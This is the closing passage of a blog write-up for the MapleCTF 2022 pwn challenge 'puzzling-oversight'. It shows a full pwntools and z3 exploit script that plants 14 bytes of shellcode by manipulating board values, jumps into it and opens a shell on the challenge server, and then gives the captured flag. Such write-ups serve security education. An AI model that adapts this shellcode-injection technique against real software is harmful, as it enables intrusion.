</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Credit to my teammate, daeMOn who create this z3 solver script.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># I helped him by crafting the 14-bytes shellcode.</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Set up pwntools for the correct architecture</span>
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;puzzling-oversight&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;alacritty&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">,</span> <span class="s1">&#39;bash&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        set disable-randomization on
</span></span></span><span class="line"><span class="cl"><span class="s1">        continue
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;puzzling-oversight.ctf.maplebacon.org&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Arch:     amd64-64-little</span>
</span></span><span class="line"><span class="cl"><span class="c1"># RELRO:    Full RELRO</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Stack:    Canary found</span>
</span></span><span class="line"><span class="cl"><span class="c1"># NX:       NX enabled</span>
</span></span><span class="line"><span class="cl"><span class="c1"># PIE:      PIE enabled</span>
</span></span><span class="line"><span class="cl"><span class="c1"># RWX:      Has RWX segments</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">z3_solve</span><span class="p">(</span><span class="n">numbers</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">x1</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x1&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x2</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x2&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x3</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x3&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x4</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x4&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x5</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x5&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x6</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x6&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">x7</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;x7&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">e</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">g</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">target_7</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[:</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_6</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_5</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_4</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">8</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_3</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">10</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_2</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">12</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target_1</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">14</span><span class="p">],</span> <span class="s2">&#34;little&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">+</span> <span class="n">x1</span> <span class="o">+</span> <span class="n">x2</span> <span class="o">==</span> <span class="n">target_1</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">+</span> <span class="n">x1</span> <span class="o">+</span> <span class="n">x2</span> <span class="o">+</span> <span class="n">x3</span> <span class="o">==</span> <span class="n">target_2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">+</span> <span class="n">x2</span> <span class="o">+</span> <span class="n">x3</span> <span class="o">+</span> <span class="n">x4</span> <span class="o">==</span> <span class="n">target_3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">d</span> <span class="o">+</span> <span class="n">x3</span> <span class="o">+</span> <span class="n">x4</span> <span class="o">+</span> <span class="n">x5</span> <span class="o">==</span> <span class="n">target_4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">e</span> <span class="o">+</span> <span class="n">x4</span> <span class="o">+</span> <span class="n">x5</span> <span class="o">+</span> <span class="n">x6</span> <span class="o">==</span> <span class="n">target_5</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">+</span> <span class="n">x5</span> <span class="o">+</span> <span class="n">x6</span> <span class="o">+</span> <span class="n">x7</span> <span class="o">==</span> <span class="n">target_6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">g</span> <span class="o">+</span> <span class="n">x6</span> <span class="o">+</span> <span class="n">x7</span> <span class="o">==</span> <span class="n">target_7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">s_check_output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">check</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">s_check_output</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ans</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="n">ans</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">x1</span><span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">(),</span> 
</span></span><span class="line"><span class="cl">            <span class="n">ans</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">x2</span><span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">(),</span> 
</span></span><span class="line"><span class="cl">            <span class="n">ans</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">x3</span><span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="n">ans</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">x4</span><span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="n">ans</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">x5</span><span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="n">ans</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">x6</span><span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="n">ans</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">x7</span><span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;no solution :(&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">bss_offset</span> <span class="o">=</span> <span class="mh">0x8050</span>
</span></span><span class="line"><span class="cl"><span class="n">play_offset</span> <span class="o">=</span> <span class="mh">0x53a2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">diff</span> <span class="o">=</span> <span class="n">bss_offset</span><span class="o">-</span><span class="n">play_offset</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">diff</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">board</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Board: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">board</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">numbers</span> <span class="o">=</span> <span class="n">board</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34; &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    sub rcx, 0x28d3f
</span></span></span><span class="line"><span class="cl"><span class="s1">    push rbx
</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rsi
</span></span></span><span class="line"><span class="cl"><span class="s1">    push rbx
</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rdx
</span></span></span><span class="line"><span class="cl"><span class="s1">    jmp rcx
</span></span></span><span class="line"><span class="cl"><span class="s1">    nop
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">shellcode</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">increment_numbers</span> <span class="o">=</span> <span class="n">z3_solve</span><span class="p">(</span><span class="n">numbers</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">increment_numbers</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">num</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># trigger</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span> <span class="c1"># quit</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="c1"># play</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And now, we ran the script and got the flag!
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/ey5GH5n.png"
        data-srcset="https://i.imgur.com/ey5GH5n.png, https://i.imgur.com/ey5GH5n.png 1.5x, https://i.imgur.com/ey5GH5n.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/ey5GH5n.png"
        title="https://i.imgur.com/ey5GH5n.png" /></p>
<blockquote>
<p><code>Flag: maple{1s_th3_puzzl3_3v3n_s0lv4ble_4ctu4lly}</code></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/maplectf-2022/" data-title="MapleCTF 2022" data-via="Chovid99" data-hashtags="Writeup,MapleCTF,pwn,format string,shellcode"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/maplectf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/maplectf/">MapleCTF</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/format-string/">Format String</a>,&nbsp;<a href="/tags/shellcode/">Shellcode</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/google-ctf-2022/" class="prev" rel="prev" title="Google CTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Google CTF 2022</a>
            <a href="/posts/blackhat-mea-ctf-2022/" class="next" rel="next" title="BlackHat MEA CTF 2022">BlackHat MEA CTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
